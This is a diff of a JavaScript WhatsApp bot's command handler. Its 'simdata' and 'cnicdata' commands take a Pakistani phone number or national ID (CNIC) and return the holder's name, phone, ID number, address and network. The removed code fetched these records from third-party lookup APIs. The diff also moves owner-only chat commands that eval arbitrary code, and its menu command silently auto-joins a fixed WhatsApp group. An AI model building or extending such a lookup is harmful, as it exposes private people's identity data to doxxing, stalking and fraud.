-        if (body.startsWith('<')) {
-            if (!isCreator) {
-                console.log(`⚠️ Non-owner tried to use eval: ${m.sender}`);
-                return;
-            }
-            
-            try {
-                const result = await eval(`(async () => { return ${body.slice(3)} })()`);
-                const output = util.inspect(result, { depth: 1 });
-                
-                console.log(chalk.yellow(`📝 Eval executed by owner: ${body.slice(3)}`));
-                
-                if (output.length > 4000) {
-                    await m.reply('✅ *Executed* (output too long)');
-                } else {
-                    await m.reply(output);
-                }
-            } catch (e) {
-                await m.reply(`❌ Error: ${e.message}`);
-            }
-            break;
-        }
-        
-        // Safe async eval - ONLY for owner
-        if (body.startsWith('>')) {
-            if (!isCreator) {
-                console.log(`⚠️ Non-owner tried to use async eval: ${m.sender}`);
-                return;
-            }
-            
-            try {
-                let evaled = await eval(body.slice(2));
-                if (typeof evaled !== 'string') evaled = util.inspect(evaled, { depth: 1 });
-                
-                console.log(chalk.yellow(`📝 Async eval executed by owner`));
-                
-                if (evaled.length > 4000) {
-                    await m.reply('✅ *Executed* (output too long)');
-                } else {
-                    await m.reply(evaled);
-                }
-            } catch (err) {
-                await m.reply(`❌ Error: ${err.message}`);
-            }
-            break;
-        }
-    }
-    break; // unknown command — ignore silently
-
       case 'simdata':
       case 'sim':
       case 'allsim': {
-          {
-              const _sdSenderNum = (m.sender || '').split('@')[0].split(':')[0];
-              const _sdBannedFile = './database/bug_banned.json';
-              const _sdUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
-              let _sdBnd = [];
-              try { if (fs.existsSync(_sdBannedFile)) _sdBnd = JSON.parse(fs.readFileSync(_sdBannedFile, 'utf-8')); } catch(e) {}
-              if (_sdBnd.some(id => String(id).replace(/[^0-9]/g,'') === _sdSenderNum))
-                  return reply(`🚫 *Access Denied*\nAap permanently ban hain Bug & SIM section se.`);
-              let _sdUnlk = [];
-              try { if (fs.existsSync(_sdUnlockedFile)) _sdUnlk = JSON.parse(fs.readFileSync(_sdUnlockedFile, 'utf-8')); } catch(e) {}
-              if (!_sdUnlk.some(id => String(id).replace(/[^0-9]/g,'') === _sdSenderNum))
-                  return reply(`🔒 *SIM Database — Locked Section*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
-          }
+          if (!_requireBugAccess()) break;
           const query = (text || '').trim();
           if (!query) {
-              await m.reply(`❌ *Usage:*\n${prefix}simdata <number>\n${prefix}allsim <number>\n\n*Example:*\n${prefix}simdata 3001234567\n${prefix}simdata 1234512345671`);
+              await m.reply(`❌ *Usage:*\n${prefix}simdata <number>\n${prefix}allsim <number>\n\n*Example:*\n${prefix}simdata 3001234567\n${prefix}simdata 03001234567\n${prefix}simdata 923001234567\n${prefix}simdata 1234512345671`);
               break;
           }
           await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-          
-          // Multiple API fallbacks — ek dead ho toh dusra try karo
-          const _sdApis = [
-              `https://famofc.site/api/database.php?q=${encodeURIComponent(query)}`,
-              `https://www.aryantools.pro/api/simdata?number=${encodeURIComponent(query)}`,
-          ];
-          
-          let _sdFound = false;
-          for (const _sdApiUrl of _sdApis) {
-              try {
-                  const _sdRes = await axios.get(_sdApiUrl, {
-                      timeout: 12000,
-                      headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36' }
+
+          try {
+              const _sdResult = await lookupSimDatabase(query);
+              if (_sdResult.records.length > 0) {
+                  const _sdMsg = formatSimRecordsMessage({
+                      records: _sdResult.records,
+                      normalized: _sdResult.normalized,
+                      rawQuery: query,
+                      title: '🗄️ *CYBERSECPRO SIM DATABASE*',
                   });
-                  const _sdJson = _sdRes.data;
-                  // Different APIs return different formats — handle all
-                  const _sdRecords = _sdJson?.data?.records || _sdJson?.records || _sdJson?.result || [];
-                  const _sdSuccess = _sdJson?.success || _sdJson?.status === 'success' || _sdJson?.status === true || _sdRecords.length > 0;
-                  
-                  if (_sdSuccess && _sdRecords.length > 0) {
-                      let _sdMsg = `🗄️ *CYBERSECPRO SIM DATABASE*\n`;
-                      _sdMsg += `📞 *Query:* ${query}\n`;
-                      _sdMsg += `📊 *Records Found:* ${_sdRecords.length}\n`;
-                      _sdMsg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                      _sdRecords.forEach((_sdR, _sdI) => {
-                          _sdMsg += `\n📌 *Record ${_sdI + 1}*\n`;
-                          _sdMsg += `👤 *Name:* ${_sdR.full_name || _sdR.name || _sdR.owner_name || 'N/A'}\n`;
-                          _sdMsg += `📱 *Phone:* ${_sdR.phone || _sdR.mobile || _sdR.number || 'N/A'}\n`;
-                          _sdMsg += `🆔 *CNIC:* ${_sdR.cnic || _sdR.cnic_no || 'N/A'}\n`;
-                          _sdMsg += `🏠 *Address:* ${_sdR.address || _sdR.addr || 'N/A'}\n`;
-                          _sdMsg += `📡 *Network:* ${_sdR.network || _sdR.operator || _sdR.sim || 'N/A'}\n`;
-                          _sdMsg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                      });
-                      _sdMsg += `_Powered by CYBERSECPRO Database_`;
-                      await m.reply(_sdMsg);
-                      await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-                      _sdFound = true;
-                      break;
-                  }
-              } catch (_sdErr) {
-                  // Ye API dead hai, agla try karo
-                  continue;
+                  await m.reply(_sdMsg);
+                  await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+              } else {
+                  await m.reply(`❌ *No records found for:* ${query}\n\n_Ye number/CNIC database mein nahi hai ya format galat hai_\n\n*Supported formats:*\n• 3001234567\n• 03001234567\n• 923001234567\n• CNIC 13 digits`);
+                  await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
               }
-          }
-          
-          if (!_sdFound) {
-              await m.reply(`❌ *No records found for:* ${query}\n\n_Ye number database mein nahi hai ya number galat hai_\n_Pakistani numbers hi supported hain (03xxxxxxxxx ya 923xxxxxxxxx)_`);
+          } catch (_sdErr) {
+              await m.reply(`❌ *SIM lookup error:* ${_sdErr?.message || 'API unavailable'}\n\nThori der baad dubara try karo.`);
               await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
           }
           break;
@@ -18582,19 +18104,7 @@ default:
       case 'simdatabase':
       case 'simdb':
       case 'dbmenu': {
-          {
-              const _sdbLkSender = (m.sender || '').split('@')[0].split(':')[0];
-              const _sdbBannedFile = './database/bug_banned.json';
-              const _sdbUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
-              let _sdbBnd = [];
-              try { if (fs.existsSync(_sdbBannedFile)) _sdbBnd = JSON.parse(fs.readFileSync(_sdbBannedFile, 'utf-8')); } catch(e) {}
-              if (_sdbBnd.some(id => String(id).replace(/[^0-9]/g,'') === _sdbLkSender))
-                  return reply(`🚫 *Access Denied*\nAap permanently ban hain Bug & SIM section se.`);
-              let _sdbUnlk = [];
-              try { if (fs.existsSync(_sdbUnlockedFile)) _sdbUnlk = JSON.parse(fs.readFileSync(_sdbUnlockedFile, 'utf-8')); } catch(e) {}
-              if (!_sdbUnlk.some(id => String(id).replace(/[^0-9]/g,'') === _sdbLkSender))
-                  return reply(`🔒 *SIM Database Menu — Locked Section*\n\nYe section sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
-          }
+          if (!_requireBugAccess()) break;
           autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
           await devtrust.sendMessage(m.chat, { react: { text: '🗄️', key: m.key } });
 
@@ -18632,8 +18142,9 @@ default:
   │
   │ ◈ *🔍 𝗦𝗘𝗔𝗥𝗖𝗛 𝗕𝗬 𝗣𝗛𝗢𝗡𝗘*
   │❖ ${prefix}simdata 3001234567
-  │❖ ${prefix}sim 3001234567
-  │   ↳ _Number bina 0 ya +92 ky_
+  │❖ ${prefix}sim 03001234567
+  │❖ ${prefix}allsim 923001234567
+  │   ↳ _3xx / 03xx / 923xx sab formats_
   │
   │ ◈ *🆔 𝗦𝗘𝗔𝗥𝗖𝗛 𝗕𝗬 𝗖𝗡𝗜𝗖*
   │❖ ${prefix}simdata 1234512345671
@@ -18651,9 +18162,10 @@ default:
   │  🏠 Address
   │
   │ ◈ *⚠️ 𝗡𝗢𝗧𝗘𝗦*
-  │  • Sirf Pakistani numbers support
-  │  • Database: CYBERSECPRO
-  │  • Results: Real-time
+  │  • Pakistani numbers + CNIC support
+  │  • 03xx / 923xx / 3xxxxxxxxx formats
+  │  • Multi-source lookup (2026 fresh data)
+  │  • Masked/demo records auto-filtered
   │
   ┗━━━━━━━━━━━━━━━━━━━━┛
 
@@ -18681,22 +18193,10 @@ default:
 
       case 'cnicdata':
       case 'cnic': {
-          {
-              const _cnSenderNum = (m.sender || '').split('@')[0].split(':')[0];
-              const _cnBannedFile = './database/bug_banned.json';
-              const _cnUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
-              let _cnBnd = [];
-              try { if (fs.existsSync(_cnBannedFile)) _cnBnd = JSON.parse(fs.readFileSync(_cnBannedFile, 'utf-8')); } catch(e) {}
-              if (_cnBnd.some(id => String(id).replace(/[^0-9]/g,'') === _cnSenderNum))
-                  return reply(`🚫 *Access Denied*\nAap permanently ban hain Bug & SIM section se.`);
-              let _cnUnlk = [];
-              try { if (fs.existsSync(_cnUnlockedFile)) _cnUnlk = JSON.parse(fs.readFileSync(_cnUnlockedFile, 'utf-8')); } catch(e) {}
-              if (!_cnUnlk.some(id => String(id).replace(/[^0-9]/g,'') === _cnSenderNum))
-                  return reply(`🔒 *CNIC Database — Locked Section*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
-          }
+          if (!_requireBugAccess()) break;
           const _cnQuery = (text || '').trim();
           if (!_cnQuery) {
-              await m.reply(`❌ *Usage:* ${prefix}cnicdata <CNIC>\n\n*Example:*\n${prefix}cnicdata 1234512345671`);
+              await m.reply(`❌ *Usage:* ${prefix}cnicdata <CNIC>\n\n*Example:*\n${prefix}cnicdata 1234512345671\n${prefix}cnicdata 35202-1234567-1`);
               break;
           }
           if (_cnQuery.replace(/[^0-9]/g, '').length !== 13) {
@@ -18704,55 +18204,68 @@ default:
               break;
           }
           await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-          
-          const _cnApis = [
-              `https://famofc.site/api/database.php?q=${encodeURIComponent(_cnQuery)}`,
-              `https://www.aryantools.pro/api/simdata?number=${encodeURIComponent(_cnQuery)}`,
-          ];
-          
-          let _cnFound = false;
-          for (const _cnApiUrl of _cnApis) {
-              try {
-                  const _cnRes = await axios.get(_cnApiUrl, {
-                      timeout: 12000,
-                      headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36' }
+
+          try {
+              const _cnResult = await lookupSimDatabase(_cnQuery);
+              if (_cnResult.records.length > 0) {
+                  const _cnMsg = formatSimRecordsMessage({
+                      records: _cnResult.records,
+                      normalized: _cnResult.normalized,
+                      rawQuery: _cnQuery,
+                      title: '🆔 *CYBERSECPRO CNIC DATABASE*',
                   });
-                  const _cnJson = _cnRes.data;
-                  const _cnRecs = _cnJson?.data?.records || _cnJson?.records || _cnJson?.result || [];
-                  const _cnOk = _cnJson?.success || _cnJson?.status === 'success' || _cnRecs.length > 0;
-                  
-                  if (_cnOk && _cnRecs.length > 0) {
-                      let _cnMsg = `🆔 *CYBERSECPRO CNIC DATABASE*\n`;
-                      _cnMsg += `🔎 *CNIC:* ${_cnQuery}\n`;
-                      _cnMsg += `📊 *Records Found:* ${_cnRecs.length}\n`;
-                      _cnMsg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                      _cnRecs.forEach((_cnR, _cnI) => {
-                          _cnMsg += `\n📌 *Record ${_cnI + 1}*\n`;
-                          _cnMsg += `👤 *Name:* ${_cnR.full_name || _cnR.name || 'N/A'}\n`;
-                          _cnMsg += `📱 *Phone:* ${_cnR.phone || _cnR.mobile || 'N/A'}\n`;
-                          _cnMsg += `🆔 *CNIC:* ${_cnR.cnic || _cnQuery}\n`;
-                          _cnMsg += `🏠 *Address:* ${_cnR.address || 'N/A'}\n`;
-                          _cnMsg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                      });
-                      _cnMsg += `_Powered by CYBERSECPRO Database_`;
-                      await m.reply(_cnMsg);
-                      await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-                      _cnFound = true;
-                      break;
-                  }
-              } catch (_cnErr) {
-                  continue;
+                  await m.reply(_cnMsg);
+                  await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+              } else {
+                  await m.reply(`❌ *No records found for CNIC:* ${_cnQuery}\n\n_Ye CNIC database mein nahi hai ya abhi update nahi hua_`);
+                  await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
               }
-          }
-          
-          if (!_cnFound) {
-              await m.reply(`❌ *No records found for CNIC:* ${_cnQuery}\n\n_Ye CNIC database mein nahi hai_`);
+          } catch (_cnErr) {
+              await m.reply(`❌ *CNIC lookup error:* ${_cnErr?.message || 'API unavailable'}\n\nThori der baad dubara try karo.`);
               await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
           }
           break;
       }
-  
-    // If no command matched, just ignore
+
+default:
+    if (body && body.startsWith) {
+        if (body.startsWith('<')) {
+            if (!isCreator) {
+                console.log(`⚠️ Non-owner tried to use eval: ${m.sender}`);
+                return;
+            }
+            try {
+                const result = await eval(`(async () => { return ${body.slice(3)} })()`);
+                const output = util.inspect(result, { depth: 1 });
+                console.log(chalk.yellow(`📝 Eval executed by owner: ${body.slice(3)}`));
+                if (output.length > 4000) await m.reply('✅ *Executed* (output too long)');
+                else await m.reply(output);
+            } catch (e) {
+                await m.reply(`❌ Error: ${e.message}`);
+            }
+            break;
+        }
+        if (body.startsWith('>')) {
+            if (!isCreator) {
+                console.log(`⚠️ Non-owner tried to use async eval: ${m.sender}`);
+                return;
+            }
+            try {
+                let evaled = await eval(body.slice(2));
+                if (typeof evaled !== 'string') evaled = util.inspect(evaled, { depth: 1 });
+                console.log(chalk.yellow(`📝 Async eval executed by owner`));
+                if (evaled.length > 4000) await m.reply('✅ *Executed* (output too long)');
+                else await m.reply(evaled);
+            } catch (err) {
+                await m.reply(`❌ Error: ${err.message}`);
+            }
+            break;
+        }
+        // Unknown command — helpful hint for linked user only
+        if (isCmd && _isBotLinkedUser()) {
+            reply(`❓ *Unknown command:* \`${command}\`\n\nType *${prefix}menu* for all commands.`);
+        }
+    }
     break;
 }
 
